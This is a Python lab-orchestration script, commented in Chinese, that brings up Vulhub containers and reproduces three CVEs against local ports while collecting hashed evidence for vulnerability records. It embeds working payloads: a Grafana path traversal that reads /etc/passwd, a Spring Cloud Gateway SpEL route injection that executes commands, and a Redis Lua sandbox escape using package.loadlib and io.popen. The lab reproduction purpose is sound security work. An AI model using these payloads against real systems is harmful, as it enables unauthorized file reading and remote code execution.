#!/usr/bin/env python3
"""靶场编排：漏洞复现 + 证据采集 + 档案回填（在测试主机 root 下运行）。

流程（一条命令完成一个 CVE 的可复核复现）：
  1. 读档案（data/records/VULN-*.yaml）取 lab.path / lab.ports / repro_steps；
  2. LabCtl.up() 启动 Vulhub 环境（守卫/端口分配/健康检查，写 lab_env/lab_run/事件/审计）；
  3. 采集 env.txt（容器、镜像 digest、ss 监听）与 meta.json；
  4. 按 CVE 类型执行白名单内 PoC（Grafana 路径穿越 / Spring Actuator SpEL / Redis Lua 逃逸），
     原始请求、响应、命令输出写入 request.txt / command.txt；
  5. LabCtl.down() 清理并记录端口释放，写 cleanup.txt；
  6. 生成 sha256sum.txt，回填档案 evidence 并置 status=verified，同步 SQLite；
  7. 校验 vuln.match(component, version) 命中该档案并打印摘要。

用法：
  sudo /opt/hornwork-venv/bin/python -m hornwork.tools.lab_repro --vuln VULN-2026-0001
  sudo ... --vuln VULN-2026-0002 --keep-up        # 保留环境供人工查看
  sudo ... --vuln VULN-2026-0003 --no-record-update
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import socket
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

# 允许以 `python /opt/hornwork/hornwork/tools/lab_repro.py` 或模块方式运行
if __package__ in (None, ""):
    sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from hornwork import schema  # noqa: E402
from hornwork.config import cfg_get, load_config  # noqa: E402
from hornwork.lab.ctl import LabCtl  # noqa: E402
from hornwork.respond.actions import ActionExecutor  # noqa: E402
from hornwork.store import open_store  # noqa: E402
from hornwork.vuln import match as vmatch  # noqa: E402
from hornwork.vuln import model, store as vstore  # noqa: E402

MAX_BODY = 64 * 1024


# ---------------------------------------------------------------------------
# 基础工具
# ---------------------------------------------------------------------------
def utc_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def write_text(path: Path, text: str) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", errors="replace")
    return path


def run(cmd: list[str], timeout: int = 60) -> dict:
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"cmd": cmd, "rc": p.returncode, "stdout": p.stdout, "stderr": p.stderr}
    except Exception as exc:  # noqa: BLE001
        return {"cmd": cmd, "rc": -1, "stdout": "", "stderr": repr(exc)}


def ss_listen() -> str:
    out = run(["ss", "-ltn"], timeout=15)
    return out.get("stdout") or ""


def port_open(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((host, int(port)), timeout=timeout):
            return True
    except OSError:
        return False


def wait_http(host: str, port: int, path: str = "/", timeout: float = 60.0) -> bool:
    """等待应用层就绪（TCP health 通过 ≠ HTTP 已可服务，尤其容器冷启动时）。"""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            resp = raw_http(host, port, "GET", path, timeout=3)
            if "200" in resp.get("head", ""):
                return True
        except OSError:
            pass
        time.sleep(1.0)
    return False


def raw_http(
    host: str,
    port: int,
    method: str,
    path: str,
    body: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 8.0,
) -> dict:
    """原始 HTTP 请求（保留 ../ 等路径，不归一化），返回状态行/响应头/响应体。"""
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}:{port}", "Connection: close"]
    for key, val in (headers or {}).items():
        lines.append(f"{key}: {val}")
    if body is not None and "Content-Length" not in (headers or {}):
        lines.append(f"Content-Length: {len(body)}")
    request = ("\r\n".join(lines) + "\r\n\r\n").encode("utf-8") + (body or b"")
    with socket.create_connection((host, int(port)), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(request)
        chunks: list[bytes] = []
        while True:
            try:
                buf = sock.recv(8192)
            except socket.timeout:
                break
            if not buf:
                break
            chunks.append(buf)
            if sum(len(c) for c in chunks) > MAX_BODY * 2:
                break
    raw = b"".join(chunks)
    head, _, body_bytes = raw.partition(b"\r\n\r\n")
    return {
        "request": request.decode("utf-8", "replace"),
        "head": head.decode("utf-8", "replace"),
        "body": body_bytes.decode("utf-8", "replace"),
        "raw_len": len(raw),
    }


def fmt_http(req: dict) -> str:
    return (
        "### 请求\n" + req.get("request", "") + "\n\n"
        "### 响应头\n" + req.get("head", "") + "\n\n"
        "### 响应体（≤64KB）\n" + (req.get("body", "") or "")[:MAX_BODY] + "\n"
    )


def image_digest(image: str) -> str:
    out = run(["docker", "image", "inspect", "--format", "{{json .RepoDigests}}", image], timeout=20)
    if out.get("rc") == 0:
        return (out.get("stdout") or "").strip()
    return ""


# ---------------------------------------------------------------------------
# 三类 PoC（全部只打白名单内的 127.0.0.1:<lab_port>）
# ---------------------------------------------------------------------------
def repro_grafana(host: str, port: int, evidence: Path) -> dict:
    """CVE-2021-43798：插件静态资源路由路径穿越，读取 /etc/passwd。"""
    wait_http(host, port, "/login", timeout=60)
    login = raw_http(host, port, "GET", "/login")
    traversal = raw_http(
        host, port, "GET",
        "/public/plugins/alertlist/../../../../../../../../etc/passwd",
    )
    write_text(evidence / "request.txt", fmt_http(login) + "\n\n" + fmt_http(traversal))
    ok = "200" in login.get("head", "") and "root:x:0" in traversal.get("body", "")
    cmd = (
        "curl -s -i http://127.0.0.1:<LAB_PORT>/login\n"
        "curl -s --path-as-is http://127.0.0.1:<LAB_PORT>/public/plugins/alertlist/../../../../../../../../etc/passwd\n"
    )
    write_text(evidence / "command.txt", cmd + "\n### 观测\n"
               f"login_status_ok={'200' in login.get('head','')}\n"
               f"passwd_leaked={'root:x:0' in traversal.get('body','')}\n")
    return {"ok": ok, "steps": ["login", "path_traversal"], "evidence": ["request.txt", "command.txt"]}


def repro_spring(host: str, port: int, evidence: Path) -> dict:
    """CVE-2022-22947：Actuator route 注入 SpEL，执行 id 并读回显。"""
    wait_http(host, port, "/actuator", timeout=90)
    transcript: list[str] = []
    actuator = raw_http(host, port, "GET", "/actuator")
    transcript.append(fmt_http(actuator))

    spel = (
        "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray("
        "T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    )
    route = {
        "id": "hacktest",
        "filters": [{"name": "AddResponseHeader",
                     "args": {"name": "Result", "value": spel}}],
        "uri": "http://example.com",
        "predicates": [{"name": "Path", "args": {"_genkey_0": "/hacktest"}}],
    }
    body = json.dumps(route).encode("utf-8")
    created = raw_http(
        host, port, "POST", "/actuator/gateway/routes/hacktest", body,
        {"Content-Type": "application/json"},
    )
    transcript.append(fmt_http(created))
    refreshed = raw_http(host, port, "POST", "/actuator/gateway/refresh", b"")
    transcript.append(fmt_http(refreshed))
    time.sleep(1.0)
    triggered = raw_http(host, port, "GET", "/actuator/gateway/routes/hacktest")
    transcript.append(fmt_http(triggered))
    deleted = raw_http(host, port, "DELETE", "/actuator/gateway/routes/hacktest")
    transcript.append(fmt_http(deleted))
    raw_http(host, port, "POST", "/actuator/gateway/refresh", b"")

    write_text(evidence / "request.txt", "\n\n".join(transcript))
    uid = "uid=" in (triggered.get("head", "") + triggered.get("body", ""))
    cmd = (
        "curl -s -i 'http://127.0.0.1:<LAB_PORT>/actuator'\n"
        "curl -s -i -X POST 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/routes/hacktest' "
        "-H 'Content-Type: application/json' --data-binary '<SpEL route JSON>'\n"
        "curl -s -i -X POST 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/refresh'\n"
        "curl -s -i 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/routes/hacktest'\n"
        "curl -s -X DELETE 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/routes/hacktest' && "
        "curl -s -X POST 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/refresh'\n"
    )
    write_text(evidence / "command.txt", cmd + "\n### 观测\n"
               f"actuator_200={'200' in actuator.get('head','')}\n"
               f"route_created_201={'201' in created.get('head','')}\n"
               f"spel_exec_uid={'uid=' in (triggered.get('head','') + triggered.get('body',''))}\n"
               f"cleanup_delete_200={'200' in deleted.get('head','')}\n")
    return {"ok": uid, "steps": ["actuator", "route_add", "refresh", "trigger", "cleanup"],
            "evidence": ["request.txt", "command.txt"]}


REDIS_LUA = (
    'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); '
    'local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res'
)


def redis_eval(host: str, port: int) -> bytes:
    args = [b"EVAL", REDIS_LUA.encode(), b"0"]
    req = ("*%d\r\n" % len(args)).encode() + b"".join(
        b"$%d\r\n%s\r\n" % (len(a), a) for a in args
    )
    with socket.create_connection((host, int(port)), timeout=5) as sock:
        sock.settimeout(5)
        sock.sendall(req)
        return sock.recv(8192)


def repro_redis(host: str, port: int, evidence: Path) -> dict:
    """CVE-2022-0543：Debian 打包 Redis 的 Lua 沙箱逃逸，执行 id。"""
    # Redis 只需 TCP 就绪；容器冷启动时端口可能尚未 accept，最多等 60s
    deadline = time.time() + 60
    while time.time() < deadline and not port_open(host, port):
        time.sleep(1.0)
    ping = b""
    try:
        with socket.create_connection((host, int(port)), timeout=5) as sock:
            sock.sendall(b"PING\r\n")
            ping = sock.recv(100)
    except OSError as exc:
        ping = repr(exc).encode()
    try:
        result = redis_eval(host, port)
    except OSError as exc:
        result = repr(exc).encode()
    result_bytes = result if isinstance(result, bytes) else str(result).encode("utf-8", "replace")
    write_text(
        evidence / "request.txt",
        "### RESP 请求（EVAL + package.loadlib 逃逸脚本）\n"
        + json.dumps({"cmd": "EVAL", "script": REDIS_LUA, "numkeys": 0}, ensure_ascii=False, indent=2)
        + "\n\n### PING 响应（repr）\n" + repr(ping)
        + "\n\n### EVAL 响应（repr）\n" + repr(result_bytes)
        + "\n\n### EVAL 响应（hex）\n" + result_bytes[:4096].hex()
        + "\n",
    )
    ok = b"uid=" in result_bytes
    write_text(evidence / "command.txt",
               "python3 - <<'PY'\n# 向 127.0.0.1:<LAB_PORT> 发送 RESP EVAL（package.loadlib 载入 luaopen_io 执行 id）\nPY\n"
               f"\n### 观测\nping={ping!r}\neval_uid={b'uid=' in result_bytes}\n")
    return {"ok": ok, "steps": ["ping", "eval_sandbox_escape"], "evidence": ["request.txt", "command.txt"]}


REPROS = {
    "VULN-2026-0001": repro_grafana,
    "VULN-2026-0002": repro_spring,
    "VULN-2026-0003": repro_redis,
}


# ---------------------------------------------------------------------------
# 主流程
# ---------------------------------------------------------------------------
def load_record_by_id(cfg: dict, vuln_id: str) -> dict:
    records_dir = str(cfg_get(cfg, "vuln.records_dir", "/opt/hornwork/data/records"))
    for rec in model.load_records(records_dir):
        if rec.get("id") == vuln_id:
            return rec
    raise SystemExit(f"档案不存在：{vuln_id}（目录 {records_dir}）")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="hornwork.tools.lab_repro", description="靶场编排复现与证据采集")
    parser.add_argument("--vuln", required=True, choices=sorted(REPROS))
    parser.add_argument("--config", default="/opt/hornwork/config.toml")
    parser.add_argument("--ttl", type=int, default=30, help="环境 TTL 分钟（默认 30）")
    parser.add_argument("--keep-up", action="store_true", help="复现后保留环境（不 down）")
    parser.add_argument("--no-record-update", action="store_true", help="不回填档案（仅采集证据）")
    args = parser.parse_args(argv)

    cfg = load_config(args.config)
    store = open_store(cfg)
    record = load_record_by_id(cfg, args.vuln)
    env_id = str((record.get("lab") or {}).get("path") or "")
    if not env_id:
        raise SystemExit("档案缺少 lab.path")
    container_ports = [int(p) for p in (record.get("lab") or {}).get("ports") or []]
    if not container_ports:
        raise SystemExit("档案缺少 lab.ports")

    auditor = ActionExecutor(store, cfg)

    def event_sink(ev: dict) -> None:
        try:
            store.insert_event(schema.normalize_event(ev, cfg))
        except Exception as exc:  # noqa: BLE001
            print(f"[warn] 事件落库失败：{exc}", file=sys.stderr)

    def audit_sink(action: str, target: str, ok: bool) -> None:
        try:
            auditor.audit_event(action=action, target=target, mode="enforce", ok=ok)
        except Exception as exc:  # noqa: BLE001
            print(f"[warn] 审计写入失败：{exc}", file=sys.stderr)

    ctl = LabCtl(cfg, store, event_sink=event_sink, audit_sink=audit_sink)
    if not Path(str(cfg_get(cfg, "lab.index_path", "/opt/hornwork/data/vulhub-index.json"))).exists():
        print("[info] 索引不存在，先构建 …")
        idx = ctl.index(force=True)
        print(f"[info] 索引条目：{idx.get('count')}")

    started = utc_now()
    print(f"== {args.vuln} / {record.get('cve')} / 环境 {env_id} ==")
    up = ctl.up(env_id, ttl_min=args.ttl, force=True)
    if not up.get("ok"):
        print(json.dumps(up, ensure_ascii=False, indent=2, default=str))
        return 1
    ports = {int(k): int(v) for k, v in (up.get("ports") or {}).items()}
    run_id = up.get("run_id")
    host = str(cfg_get(cfg, "lab.host_bind", "127.0.0.1"))
    # 取档案声明的第一个容器端口对应的宿主端口
    lab_port = ports.get(container_ports[0])
    if not lab_port:
        lab_port = next(iter(ports.values()))
    print(f"环境已启动：ports={ports} run_id={run_id}，使用 {host}:{lab_port}")

    data_dir = Path(str(cfg_get(cfg, "lab.data_dir", "/opt/hornwork/data")))
    stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    evidence_dir = data_dir / "evidence" / args.vuln / stamp
    evidence_dir.mkdir(parents=True, exist_ok=True)

    # 环境证据
    status = ctl.status(env_id)
    images = [str(i) for i in (next((e for e in ctl._entries() if e.get("env_id") == env_id), {}) or {}).get("images") or []]  # noqa: SLF001
    env_text = (
        f"# 环境证据\n时间：{utc_now()}\nenv_id：{env_id}\nrun_id：{run_id}\n"
        f"ports：{json.dumps(ports)}\nhost_bind：{host}\n\n## lab status\n"
        f"{json.dumps(status, ensure_ascii=False, indent=2, default=str)}\n\n"
        f"## 镜像 digest\n" + "\n".join(f"{img}: {image_digest(img)}" for img in images) +
        f"\n\n## ss -ltn\n{ss_listen()}\n"
    )
    write_text(evidence_dir / "env.txt", env_text)

    # 复现（异常也要保证清理，避免环境残留）
    try:
        repro = REPROS[args.vuln](host, lab_port, evidence_dir)
    except Exception as exc:  # noqa: BLE001 - 复现失败也必须走清理与证据留存
        repro = {"ok": False, "error": repr(exc)}
        write_text(evidence_dir / "command.txt", f"### 复现异常\n{exc!r}\n")
    print(f"复现结果：ok={repro.get('ok')} steps={repro.get('steps')}")

    # 清理
    cleanup = {"down_ok": False, "freed_ports": [], "listening_after_cleanup": ""}
    if not args.keep_up:
        down = ctl.down(env_id)
        cleanup["down_ok"] = bool(down.get("ok"))
        cleanup["freed_ports"] = down.get("freed_ports") or []
        cleanup["listening_after_cleanup"] = ss_listen()
        write_text(
            evidence_dir / "cleanup.txt",
            f"# 清理记录\n时间：{utc_now()}\nlab down：{json.dumps(down, ensure_ascii=False, default=str)}\n\n"
            f"## 剩余监听端口检查\n{cleanup['listening_after_cleanup']}\n",
        )
    else:
        write_text(evidence_dir / "cleanup.txt", f"# 保留环境（--keep-up）\n时间：{utc_now()}\n")

    # 记录更新
    if not args.no_record_update:
        entries = []
        for name in ("env.txt", "request.txt", "command.txt", "cleanup.txt"):
            path = evidence_dir / name
            if path.is_file():
                entries.append({
                    "path": str(path.relative_to(data_dir)),
                    "sha256": sha256_file(path),
                    "ts": utc_now(),
                })
        record["evidence"] = entries
        record["status"] = "verified"
        record["updated_at"] = utc_now()
        rec_path = Path(str(cfg_get(cfg, "vuln.records_dir", "/opt/hornwork/data/records"))) / f"{args.vuln}.yaml"
        model.save_record(str(rec_path), record)
        sync = vstore.sync_records(store, [record])
        print(f"档案回填：{rec_path}（{len(entries)} 条证据），sync={sync}")

    # meta + sha256 清单（最后写，清单覆盖前面全部文件）
    meta = {
        "vuln_id": args.vuln,
        "cve": record.get("cve"),
        "env_id": env_id,
        "lab_run_id": run_id,
        "started_at": started,
        "finished_at": utc_now(),
        "host_bind": host,
        "ports": ports,
        "repo_digests": {img: image_digest(img) for img in images},
        "repro": repro,
        "cleanup": cleanup,
        "operator": os.environ.get("SUDO_USER") or os.environ.get("USER") or "root",
    }
    write_text(evidence_dir / "meta.json", json.dumps(meta, ensure_ascii=False, indent=2, default=str))
    manifest = []
    for path in sorted(evidence_dir.iterdir()):
        if path.is_file() and path.name != "sha256sum.txt":
            manifest.append(f"{sha256_file(path)}  {path.name}")
    write_text(evidence_dir / "sha256sum.txt", "\n".join(manifest) + "\n")

    # IF-18 自检：component/version 应命中该档案
    component_text = str(record.get("component") or "")
    tokens = component_text.split()
    component = " ".join(t for t in tokens if not t[:1].isdigit()).strip() or component_text
    version = next((t for t in tokens if t[:1].isdigit()), "")
    if not version:
        # 组件名未带版本（如 Redis 发行版包）时，用受影响区间起点做自检
        ranges = record.get("affected_versions") or []
        introduced = str((ranges[0] or {}).get("introduced") or "") if ranges else ""
        version = introduced if introduced[:1].isdigit() else ""
    matched = vmatch.match(store, cfg, {"component": component, "version": version}) if version else {}
    hits = [m.get("vuln_id") for m in (matched.get("matched") or [])]

    summary = {
        "vuln_id": args.vuln,
        "repro_ok": repro.get("ok"),
        "evidence_dir": str(evidence_dir),
        "files": len(manifest),
        "cleanup": cleanup.get("down_ok"),
        "match_hit": args.vuln in hits,
        "match_result": hits,
    }
    print(json.dumps(summary, ensure_ascii=False, indent=2))
    return 0 if repro.get("ok") else 2


if __name__ == "__main__":
    sys.exit(main())
